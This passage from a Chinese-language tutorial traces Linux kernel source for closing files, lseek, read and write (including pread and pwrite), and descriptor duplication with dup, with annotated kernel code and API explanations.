<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __put_unused_fd(<span class="keyword">struct</span> files_struct *files, <span class="type">unsigned</span> <span class="type">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 取得文件描述符表*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> =</span> files_fdtable(files);</span><br><span class="line">    <span class="comment">/* 清除fd在open_fds位图的位*/</span></span><br><span class="line">    __FD_CLR(fd, fdt-&gt;open_fds);</span><br><span class="line">    <span class="comment">/* 如果fd小于next_fd，重置next_fd为释放的fd */</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; files-&gt;next_fd)</span><br><span class="line">        files-&gt;next_fd = fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>结合之前的<code>alloc_fd()</code>可知，Linux文件描述符策略永远选择最小的可用的文件描述符。从<code>__put_unused_fd</code>退出后，close会接着调用filp_close，其调用路径为filp_close-&gt;fput。在fput中，会对当前文件struct file的引用计数减一并检查其值是否为0。当引用计数为0时，表示该struct file没有被其他人使用，则可以调用<code>__fput</code>执行真正的文件释放操作，然后调用要关闭文件所属文件系统的release函数，从而实现针对不同的文件类型来执行不同的关闭操作。</p>
<hr>
<p>这里选择<code>socket</code>文件系统作为示例，来说明Linux如何挂载文件系统指定的文件操作函数<code>files_operations</code>。socket.c中定义了其文件操作函数file_operations，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">socket_file_ops</span> =</span> &#123;</span><br><span class="line">    .owner =    THIS_MODULE,</span><br><span class="line">    .llseek =   no_llseek,</span><br><span class="line">    .aio_read = sock_aio_read,</span><br><span class="line">    .aio_write =    sock_aio_write,</span><br><span class="line">    .poll =     sock_poll,</span><br><span class="line">    .unlocked_ioctl = sock_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">    .compat_ioctl = compat_sock_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    .mmap =     sock_mmap,</span><br><span class="line">    .open =     sock_no_open,   <span class="comment">/* special open code to disallow open via /proc */</span></span><br><span class="line">    .release =  sock_close,</span><br><span class="line">    .fasync =   sock_fasync,</span><br><span class="line">    .sendpage = sock_sendpage,</span><br><span class="line">    .splice_write = generic_splice_sendpage,</span><br><span class="line">    .splice_read =  sock_splice_read,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>函数<code>sock_alloc_file</code>用于申请socket文件描述符及文件管理结构file结构。它调用alloc_file来申请管理结构file，并将socket_file_ops作为参数，如下所示：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">file = alloc_file(&amp;path, FMODE_READ | FMODE_WRITE, &amp;socket_file_ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> file *<span class="title function_">alloc_file</span><span class="params">(<span class="keyword">struct</span> path *path, <span class="type">fmode_t</span> mode,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="keyword">struct</span> file_operations *fop)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="comment">/* 申请一个file */</span></span><br><span class="line">    file = get_empty_filp();</span><br><span class="line">    <span class="keyword">if</span> (!file)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    file-&gt;f_path = *path;</span><br><span class="line">    file-&gt;f_mapping = path-&gt;dentry-&gt;d_inode-&gt;i_mapping;</span><br><span class="line">    file-&gt;f_mode = mode;</span><br><span class="line">    <span class="comment">/* 将自定义的文件操作函数赋给file-&gt;f_op */</span></span><br><span class="line">    file-&gt;f_op = fop;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在初始化file结构的时候，socket文件系统将其自定义的文件操作赋给了file-&gt;f_op，从而实现了在VFS中可以调用socket文件系统自定义的操作。</p>
<h1 id="文件偏移"><a href="#文件偏移" class="headerlink" title="文件偏移"></a>文件偏移</h1><p>文件偏移是基于某个打开文件来说的，一般情况下，读写操作都会从当前的偏移位置开始读写（所以read和write都没有显式地传入偏移量），并且在读写结束后更新偏移量。</p>
<h2 id="lseek函数简介"><a href="#lseek函数简介" class="headerlink" title="lseek函数简介"></a>lseek函数简介</h2><p>lseek 原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">off_t</span> <span class="title function_">lseek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset, <span class="type">int</span> whence)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数</strong></p>
<p>该函数用于将fd的文件偏移量设置为以whence为起点，偏移为offset的位置。其中whence可以为三个值：SEEK_SET、SEEK_CUR和SEEK_END，分别表示为“文件的起始位置”、“文件的当前位置”和“文件的末尾”，而offset的取值正负均可。lseek执行成功后，会返回新的文件偏移量。</p>
<p><strong>返回值</strong></p>
<p>当lseek执行成功时，它会返回最终以文件起始位置为起点的偏移位置。如果出错，则返回-1，同时errno被设置为对应的错误值。也就是说，一般情况下，对于普通文件来说，lseek都是返回非负的整数，但是<strong>对于某些设备文件来说，是允许返回负的偏移量</strong>。因此要想判断lseek是否真正出错，必须在调用lseek前将errno重置为0，然后再调用lseek，同时检查返回值是否为-1及errno的值。只有当两个同时成立时，才表明lseek真正出错了。因为这里的文件偏移都是内核的概念，所以<strong>lseek并不会引起任何真正的I&#x2F;O操作</strong>。</p>
<h2 id="lseek-内核源码追踪"><a href="#lseek-内核源码追踪" class="headerlink" title="lseek 内核源码追踪"></a>lseek 内核源码追踪</h2><p>lseek的源码位于read_write.c中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(lseek, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">off_t</span>, offset, <span class="type">unsigned</span> <span class="type">int</span>, origin)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">off_t</span> retval;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line">    <span class="type">int</span> fput_needed;</span><br><span class="line">    retval = -EBADF;</span><br><span class="line">    <span class="comment">/* 根据fd得到file指针 */</span></span><br><span class="line">    file = fget_light(fd, &amp;fput_needed);</span><br><span class="line">    <span class="keyword">if</span> (!file)</span><br><span class="line">        <span class="keyword">goto</span> bad;</span><br><span class="line">    retval = -EINVAL;</span><br><span class="line">    <span class="comment">/* 对初始位置进行检查 */</span></span><br><span class="line">    <span class="keyword">if</span> (origin &lt;= SEEK_MAX) &#123;</span><br><span class="line">        <span class="type">loff_t</span> res = vfs_llseek(file, offset, origin);</span><br><span class="line">     <span class="comment">/* </span></span><br><span class="line"><span class="comment">     *  下面这段代码，先使用res来给retval赋值，然后再次判断res是否与retval相等。</span></span><br><span class="line"><span class="comment">     *  为什么会有这样的逻辑呢？什么时候两者会不相等呢？只有在retval与res的位数不相等的情况下。</span></span><br><span class="line"><span class="comment">	 *  retval的类型是off_t-&gt;__kernel_off_t-&gt;long；</span></span><br><span class="line"><span class="comment">	 *	而res的类型是loff_t-&gt;__kernel_off_t-&gt;long long;</span></span><br><span class="line"><span class="comment">	 *	在32位机上，前者是32位，而后者是64位。当res的值超过了retval的范围时，两者将会不等。</span></span><br><span class="line"><span class="comment">	 *	即实际偏移量超过了long类型的表示范围。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">        retval = res;</span><br><span class="line">        <span class="keyword">if</span> (res != (<span class="type">loff_t</span>)retval)</span><br><span class="line">            retval = -EOVERFLOW;    <span class="comment">/* LFS: should only happen on 32 bit platforms */</span></span><br><span class="line">    &#125;</span><br><span class="line">    fput_light(file, fput_needed);</span><br><span class="line">bad:</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后进入vfs_llseek，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">loff_t</span> <span class="title function_">vfs_llseek</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">loff_t</span> offset, <span class="type">int</span> origin)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">loff_t</span> (*fn)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="comment">/* 默认的lseek操作是no_llseek，当file没有对应的llseek实现时，就会调用no_llseek，并返回-ESPIPE错误 */</span></span><br><span class="line">    fn = no_llseek;</span><br><span class="line">    <span class="keyword">if</span> (file-&gt;f_mode &amp; FMODE_LSEEK) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file-&gt;f_op &amp;&amp; file-&gt;f_op-&gt;llseek)</span><br><span class="line">            fn = file-&gt;f_op-&gt;llseek;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fn(file, offset, origin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当file支持llseek操作时，就会调用具体的llseek函数。在此，选择default_llseek作为实例，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">loff_t</span> <span class="title function_">default_llseek</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">loff_t</span> offset, <span class="type">int</span> origin)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file-&gt;f_path.dentry-&gt;d_inode;</span><br><span class="line">    <span class="type">loff_t</span> retval;</span><br><span class="line">    mutex_lock(&amp;inode-&gt;i_mutex);</span><br><span class="line">    <span class="keyword">switch</span> (origin) &#123;</span><br><span class="line">        <span class="keyword">case</span> SEEK_END:</span><br><span class="line">            <span class="comment">/* 最终偏移等于文件的大小加上指定的偏移量*/</span></span><br><span class="line">            offset += i_size_read(inode);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SEEK_CUR:</span><br><span class="line">            <span class="comment">/* offset为0时，并不改变当前的偏移量，而是直接返回当前偏移量*/</span></span><br><span class="line">            <span class="keyword">if</span> (offset == <span class="number">0</span>) &#123;</span><br><span class="line">                retval = file-&gt;f_pos;</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* 若offset不为0，则最终偏移等于指定偏移加上当前偏移 */</span></span><br><span class="line">            offset += file-&gt;f_pos;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SEEK_DATA:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * In the generic case the entire file is data, so as</span></span><br><span class="line"><span class="comment">             * long as offset isn&#x27;t at the end of the file then the</span></span><br><span class="line"><span class="comment">             * offset is data.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="comment">/* 如注释所言，对于一般文件，只要指定偏移不超过文件大小，那么指定偏移的位置就是数据位置 */</span></span><br><span class="line">            <span class="keyword">if</span> (offset &gt;= inode-&gt;i_size) &#123;</span><br><span class="line">                retval = -ENXIO;</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SEEK_HOLE:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * There is a virtual hole at the end of the file, so</span></span><br><span class="line"><span class="comment">             * as long as offset isn&#x27;t i_size or larger, return</span></span><br><span class="line"><span class="comment">             * i_size.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">           <span class="comment">/* 只要指定偏移不超过文件大小，那么下一个空洞位置就是文件的末尾*/</span></span><br><span class="line">                <span class="keyword">if</span> (offset &gt;= inode-&gt;i_size) &#123;</span><br><span class="line">                retval = -ENXIO;</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">            offset = inode-&gt;i_size;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retval = -EINVAL;</span><br><span class="line">    <span class="comment">/* 对于一般文件来说，最终的offset必须大于或等于0，或者该文件的模式要求只能产生无符号的偏移量。否则就会报错 */</span></span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= <span class="number">0</span> || unsigned_offsets(file)) &#123;</span><br><span class="line">        <span class="comment">/* 当最终偏移不等于当前位置时，则更新文件的当前位置*/</span></span><br><span class="line">        <span class="keyword">if</span> (offset != file-&gt;f_pos) &#123;</span><br><span class="line">            file-&gt;f_pos = offset;</span><br><span class="line">            file-&gt;f_version = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        retval = offset;</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    mutex_unlock(&amp;inode-&gt;i_mutex);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="read-函数简介"><a href="#read-函数简介" class="headerlink" title="read 函数简介"></a>read 函数简介</h2><p>read函数原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure></div>

<p>read尝试从fd中读取count个字节到buf中，并返回成功读取的字节数，同时将文件偏移向前移动相同的字节数。返回0的时候则表示已经到了“文件尾”。read还有可能读取比count小的字节数。使用read进行数据读取时，要注意正确地处理错误，也是说read返回-1时，如果errno为EAGAIN、EWOULDBLOCK或EINTR，一般情况下都不能将其视为错误。因为前两者是由于当前fd为非阻塞且没有可读数据时返回的，后者是由于read被信号中断所造成的。这两种情况基本上都可以视为正常情况。</p>
<h2 id="read-内核源码追踪"><a href="#read-内核源码追踪" class="headerlink" title="read 内核源码追踪"></a>read 内核源码追踪</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(read, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">char</span> __user *, buf, <span class="type">size_t</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line">    <span class="type">int</span> fput_needed;</span><br><span class="line">    <span class="comment">/* 通过文件描述符fd得到管理结构file */</span></span><br><span class="line">    file = fget_light(fd, &amp;fput_needed);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">        <span class="comment">/* 得到文件的当前偏移量*/</span></span><br><span class="line">        <span class="type">loff_t</span> pos = file_pos_read(file);</span><br><span class="line">        <span class="comment">/* 利用vfs进行真正的read */</span></span><br><span class="line">        ret = vfs_read(file, buf, count, &amp;pos);</span><br><span class="line">        <span class="comment">/* 更新文件偏移量*/</span></span><br><span class="line">        file_pos_write(file, pos);</span><br><span class="line">        <span class="comment">/* 归还管理结构file，如有必要，就进行引用计数操作*/</span></span><br><span class="line">        fput_light(file, fput_needed);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再进入vfs_read，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vfs_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> ret;</span><br><span class="line">    <span class="comment">/* 检查文件是否为读取打开 */</span></span><br><span class="line">    <span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_READ))</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line">    <span class="comment">/* 检查文件是否支持读取操作 */</span></span><br><span class="line">    <span class="keyword">if</span> (!file-&gt;f_op || (!file-&gt;f_op-&gt;read &amp;&amp; !file-&gt;f_op-&gt;aio_read))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/* 检查用户传递的参数buf的地址是否可写 */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!access_ok(VERIFY_WRITE, buf, count)))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">/* 检查要读取的文件范围实际可读取的字节数 */</span></span><br><span class="line">    ret = rw_verify_area(READ, file, pos, count);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 根据上面的结构，调整要读取的字节数 */</span></span><br><span class="line">        count = ret;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        *  如果定义read操作，则执行定义的read操作。</span></span><br><span class="line"><span class="comment">        *  如果没有定义read操作，则调用do_sync_read—其利用异步aio_read来完成同步的read操作。</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">        <span class="keyword">if</span> (file-&gt;f_op-&gt;read)</span><br><span class="line">            ret = file-&gt;f_op-&gt;read(file, buf, count, pos);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ret = do_sync_read(file, buf, count, pos);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 读取了一定的字节数，进行通知操作 */</span></span><br><span class="line">            fsnotify_access(file);</span><br><span class="line">            <span class="comment">/* 增加进程读取字节的统计计数 */</span></span><br><span class="line">            add_rchar(current, ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 增加进程系统调用的统计计数 */</span></span><br><span class="line">        inc_syscr(current);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面的代码为read公共部分的源码分析，具体的读取动作是由实际的文件系统决定的。</p>
<hr>
<h2 id="pread-简介"><a href="#pread-简介" class="headerlink" title="pread 简介"></a>pread 简介</h2><p>Linux还提供pread从指定偏移位置读取数据。其实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE4(pread64, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">char</span> __user *, buf,</span><br><span class="line">			<span class="type">size_t</span>, count, <span class="type">loff_t</span>, pos)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pos &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f = fdget(fd);</span><br><span class="line">	<span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">		ret = -ESPIPE;</span><br><span class="line">		<span class="keyword">if</span> (f.file-&gt;f_mode &amp; FMODE_PREAD)</span><br><span class="line">			ret = vfs_read(f.file, buf, count, &amp;pos);</span><br><span class="line">		fdput(f);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>pread不会从文件表中获取当前偏移，而是直接使用用户传递的偏移量，并且在读取完毕后，不会更改当前文件的偏移量。</p>
<h1 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h1><h2 id="write-函数简介"><a href="#write-函数简介" class="headerlink" title="write 函数简介"></a>write 函数简介</h2><p>write 函数原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure></div>

<p>write尝试从buf指向的地址，写入count个字节到文件描述符fd中，并返回成功写入的字节数，同时将文件偏移向前移动相同的字节数。write有可能写入比指定count少的字节数。</p>
<h2 id="write-内核源码追踪"><a href="#write-内核源码追踪" class="headerlink" title="write 内核源码追踪"></a>write 内核源码追踪</h2><p>write的源码与read的很相似，位于read_write.c中，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(write, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> __user *, buf,</span><br><span class="line">       <span class="type">size_t</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line">    <span class="type">int</span> fput_needed;</span><br><span class="line">    <span class="comment">/* 得到file管理结构指针 */</span></span><br><span class="line">    file = fget_light(fd, &amp;fput_needed);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">        <span class="comment">/* 得到当前的文件偏移 */</span></span><br><span class="line">        <span class="type">loff_t</span> pos = file_pos_read(file);</span><br><span class="line">        <span class="comment">/* 利用VFS写入 */</span></span><br><span class="line">        ret = vfs_write(file, buf, count, &amp;pos);</span><br><span class="line">        <span class="comment">/* 更新文件偏移量 */</span></span><br><span class="line">        file_pos_write(file, pos);</span><br><span class="line">        <span class="comment">/* 释放文件管理指针 file */</span></span><br><span class="line">        fput_light(file, fput_needed);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>进入vfs_write，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vfs_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> ret;</span><br><span class="line">    <span class="comment">/* 检查文件是否为写入打开 */</span></span><br><span class="line">    <span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line">    <span class="comment">/* 检查文件是否支持打开操作 */</span></span><br><span class="line">    <span class="keyword">if</span> (!file-&gt;f_op || (!file-&gt;f_op-&gt;write &amp;&amp; !file-&gt;f_op-&gt;aio_write))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/* 检查用户给定的地址范围是否可读取 */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!access_ok(VERIFY_READ, buf, count)))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">/* 验证文件从pos起始是否可以写入count个字节数，并返回可以写入的字节数 */</span></span><br><span class="line">    ret = rw_verify_area(WRITE, file, pos, count);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 更新写入字节数 */</span></span><br><span class="line">        count = ret;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        *  如果定义write操作，则执行定义的write操作。</span></span><br><span class="line"><span class="comment">		*  如果没有定义write操作，则调用do_sync_write—其利用异步aio_write来完成同步的write操作。</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">        <span class="keyword">if</span> (file-&gt;f_op-&gt;write)</span><br><span class="line">            ret = file-&gt;f_op-&gt;write(file, buf, count, pos);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ret = do_sync_write(file, buf, count, pos);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 写入了一定的字节数，进行通知操作 */</span></span><br><span class="line">            fsnotify_modify(file);</span><br><span class="line">            <span class="comment">/* 增加进程读取字节的统计计数 */</span></span><br><span class="line">            add_wchar(current, ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 增加进程系统调用的统计计数 */</span></span><br><span class="line">        inc_syscw(current);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="pwrite-简介"><a href="#pwrite-简介" class="headerlink" title="pwrite 简介"></a>pwrite 简介</h2><p>pwrite 与 pread 类似，其实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE4(pwrite64, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> __user *, buf,</span><br><span class="line">			 <span class="type">size_t</span>, count, <span class="type">loff_t</span>, pos)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pos &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f = fdget(fd);</span><br><span class="line">	<span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">		ret = -ESPIPE;</span><br><span class="line">		<span class="keyword">if</span> (f.file-&gt;f_mode &amp; FMODE_PWRITE)  </span><br><span class="line">			ret = vfs_write(f.file, buf, count, &amp;pos);</span><br><span class="line">		fdput(f);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h1><p>Linux提供了三个复制文件描述符的系统调用，分别为：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup3</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>dup</code> 会使用一个最小的未用文件描述符作为复制后的文件描述符。</p>
</li>
<li><p><code>dup2</code> 是使用用户指定的文件描述符newfd来复制oldfd的。如果newfd已经是打开的文件描述符，Linux会先关闭newfd，然后再复制oldfd。</p>
</li>
<li><p><code>dup3</code> 只有定义了feature宏“_GNU_SOURCE”才可以使用，它比dup2多了一个参数，可以指定标志，不过目前仅仅支持O_CLOEXEC标志，可在newfd上设置O_CLOEXEC标志。定义dup3的原因与open类似，可以在进行dup操作的同时原子地将fd设置为O_CLOEXEC，从而避免将文件内容暴露给子进程。</p>
</li>
</ul>
<h2 id="dup-内核源码追踪"><a href="#dup-内核源码追踪" class="headerlink" title="dup 内核源码追踪"></a>dup 内核源码追踪</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE1(dup, <span class="type">unsigned</span> <span class="type">int</span>, fildes)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -EBADF;</span><br><span class="line">    <span class="comment">/* 必须先得到文件管理结构file，同时也是对描述符fildes的检查 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> fget_raw(fildes);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">        <span class="comment">/* 得到一个未使用的文件描述符*/</span></span><br><span class="line">        ret = get_unused_fd();</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 将文件描述符与file指针关联起来*/</span></span><br><span class="line">            fd_install(ret, file);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fput(file);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>fd_install</code> 的实现：</p>
